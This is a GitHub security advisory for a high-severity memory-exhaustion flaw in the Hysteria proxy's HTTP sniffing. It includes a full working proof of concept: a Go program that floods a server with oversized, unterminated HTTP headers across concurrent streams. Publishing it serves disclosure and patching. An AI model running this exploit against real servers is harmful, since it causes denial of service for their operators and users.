# [H] Hysteria: http large header with sniff cause server DoS

## Summary
Severity: High
Advisory: GHSA-jqc5-2p7q-fqfc
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-jqc5-2p7q-fqfc
Type: github-advisory

## Affected
- Go: `github.com/apernet/hysteria` — affected >=0 <2.9.2

## Details
### Summary

Sending an excessively large header by an attacker could lead to a server-side DoS attack.

### Details
The current sniff implementation does not explicitly specify the upper limit for HTTP headers. Attackers can continuously send excessively large headers without including \r\n\r\n, leading to ServerDoS and OutOfMemory errors.

### PoC

server.yaml
```
listen: 127.0.0.1:8443

tls:
  cert: poc_server.crt
  key: poc_server.key

auth:
  type: password
  password: sniff-poc-password

sniff:
  enable: true
  timeout: 10s
  rewriteDomain: false
  tcpPorts: 80

masquerade:
  type: string
  string:
    content: nope
    statusCode: 404
```

poc.sh
```
#!/bin/bash
go build poc_sniff_http_dos.go
./poc_sniff_http_dos \
    --server 127.0.0.1:8443 \
    --auth sniff-poc-password \
    --insecure \
    --target-host 192.0.2.1 \
    --target-port 80 \
    --connections 16 \
    --header-bytes 838860800 \
    --linger 12
```

poc.go
```
//go:build poc

package main

import (
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	coreclient "github.com/apernet/hysteria/core/v2/client"
	"github.com/apernet/hysteria/extras/v2/obfs"
)

type attackConnFactory struct {
	obfuscator obfs.Obfuscator
}

func (f *attackConnFactory) New(_ net.Addr) (net.PacketConn, error) {
	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil, err
	}
	if f.obfuscator == nil {
		return conn, nil
	}
	return obfs.WrapPacketConn(conn, f.obfuscator), nil
}

func buildHeaderPayload(totalBytes, chunkSize int) []byte {
	prefix := []byte("GET / HTTP/1.1\r\nHost: victim\r\nUser-Agent: hy2-sniff-poc\r\n")
	if totalBytes <= len(prefix) {
		return prefix[:totalBytes]
	}
	out := make([]byte, 0, totalBytes)
	out = append(out, prefix...)
	linePayload := chunkSize - 32
	if linePayload < 64 {
		linePayload = 64
	}
	for i := 0; len(out) < totalBytes; i++ {
		line := fmt.Sprintf("X-Fill-%06d: %s\r\n", i, strings.Repeat("A", linePayload))
		remain := totalBytes - len(out)
		if len(line) > remain {
			line = line[:remain]
		}
		out = append(out, line...)
	}
	// 故意不追加最后一个空行 \r\n，迫使服务端在 sniff timeout 内持续读 header。
	return out
}

func makeClient(server, auth, sni string, insecure bool, pinSHA256, salamanderPSK string) (coreclient.Client, error) {
	serverAddr, err := net.ResolveUDPAddr("udp", server)
	if err != nil {
		return nil, err
	}
	cfg := &coreclient.Config{
		ConnFactory: &attackConnFactory{},
		ServerAddr:  serverAddr,
		Auth:        auth,
		TLSConfig: coreclient.TLSConfig{
			InsecureSkipVerify: insecure,
		},
	}
	host, _, err := net.SplitHostPort(server)
	if err == nil && sni == "" && net.ParseIP(host) == nil {
		cfg.TLSConfig.ServerName = host
	}
	if sni != "" {
		cfg.TLSConfig.ServerName = sni
	}
	if pinSHA256 != "" {
		nHash := strings.ToLower(strings.ReplaceAll(pinSHA256, ":", ""))
		cfg.TLSConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return errors.New("no peer certificate")
			}
			h := sha256.Sum256(rawCerts[0])
			if hex.EncodeToString(h[:]) == nHash {
				return nil
			}
			return errors.New("no certificate matches the pinned hash")
		}
	}
	if salamanderPSK != "" {
		ob, err := obfs.NewSalamanderObfuscator([]byte(salamanderPSK))
		if err != nil {
			return nil, err
		}
		cfg.ConnFactory = &attackConnFactory{obfuscator: ob}
	}
	c, _, err := coreclient.NewClient(cfg)
	return c, err
}

func worker(id int, c coreclient.Client, target string, payload []byte, sendChunk int, linger time.Duration, results []string) {
	conn, err := c.TCP(target)
	if err != nil {
		results[id] = fmt.Sprintf("worker=%d dial error=%v", id, err)
		return
	}
	defer conn.Close()
	_ = conn.SetWriteDeadline(time.Now().Add(linger))
	sent := 0
	for sent < len(payload) {
		end := sent + sendChunk
		if end > len(payload) {
			end = len(payload)
		}
		n, err := conn.Write(payload[sent:end])
		if err != nil {
			results[id] = fmt.Sprintf("worker=%d partial_sent=%d error=%v", id, sent, err)
			return
		}
		sent += n
	}
	time.Sleep(linger)
	results[id] = fmt.Sprintf("worker=%d sent=%d", id, sent)
}

func main() {
	server := flag.String("server", "", "Hysteria server address, e.g. 1.2.3.4:443")
	auth := flag.String("auth", "", "Hysteria auth string/password")
	sni := flag.String("sni", "", "optional TLS SNI")
	insecure := flag.Bool("insecure", false, "skip TLS verification")
	pinSHA256 := flag.String("pin-sha256", "", "optional pinned server cert SHA256")
	salamanderPSK := flag.String("obfs-salamander-password", "", "optional salamander obfs password")
	targetHost := flag.String("target-host", "192.0.2.1", "must usually be an IP so sniff.Check() runs when rewriteDomain=false")
	targetPort := flag.Int("target-port", 80, "target port that should be covered by server sniff.tcpPorts")
	connections := flag.Int("connections", 16, "number of concurrent Hysteria TCP streams")
	headerBytes := flag.Int("header-bytes", 8*1024*1024, "bytes of incomplete HTTP header per stream")
	buildChunk := flag.Int("build-chunk", 8192, "approximate size of generated filler header lines")
	sendChunk := flag.Int("send-chunk", 64*1024, "bytes written per conn.Write call")
	lingerSec := flag.Float64("linger", 12, "seconds to keep each stream open after writing")
	flag.Parse()

	if *server == "" || *auth == "" {
		panic("--server and --auth are required")
	}
	if !*insecure && *pinSHA256 == "" {
		panic("provide one of: --insecure / --pin-sha256")
	}

	payload := buildHeaderPayload(*headerBytes, *buildChunk)
	target := net.JoinHostPort(*targetHost, fmt.Sprintf("%d", *targetPort))
	linger := time.Duration(*lingerSec * float64(time.Second))

	fmt.Printf("[*] server=%s target=%s streams=%d payload=%d\n", *server, target, *connections, len(payload))

	c, err := makeClient(*server, *auth, *sni, *insecure, *pinSHA256, *salamanderPSK)
	if err != nil {
		panic(err)
	}
	defer c.Close()

	results := make([]string, *connections)
	var wg sync.WaitGroup
	start := time.Now()
	for i := 0; i < *connections; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			worker(i, c, target, payload, *sendChunk, linger, results)
		}(i)
	}

	wg.Wait()
	fmt.Printf("[*] elapsed=%s\n", time.Since(start).Round(time.Millisecond))
	for _, line := range results {
		fmt.Printf("    %s\n", line)
	}
	fmt.Println("[+] sent incomplete oversized HTTP headers; check server-side memory / stability")
}

```
### Impact

Testing showed that the server side used a maximum of 16GB.

Server memory DoS and may cause OOM.

## References
- https://github.com/apernet/hysteria/security/advisories/GHSA-jqc5-2p7q-fqfc
- https://github.com/apernet/hysteria
